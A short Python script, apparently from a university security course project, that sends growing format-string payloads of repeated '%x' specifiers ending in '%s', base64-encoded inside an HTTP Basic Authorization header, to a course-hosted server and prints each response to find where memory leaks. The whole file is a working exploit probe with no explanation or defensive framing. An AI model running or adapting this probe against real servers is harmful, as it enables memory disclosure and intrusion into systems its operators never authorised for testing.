import requests
import base64
import time


p = "%x"
s = "%s"

for i in range(1, 20):
    payl = p  + " " + p
    for j in range(1, i):
        payl = payl + " " + p
    payl = payl + " " + s
    print(payl)


    headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
   
    try:
        response = requests.get("http://project-2.csec.chatzi.org:8000", headers=headers, timeout=2)
        print(response.status_code)
        print(response.headers)
        print(response.text)
    except requests.Timeout:
        print("Request timed out!")
    except requests.RequestException as e:
        print(f"Error occurred: {e}")


    time.sleep(1/2)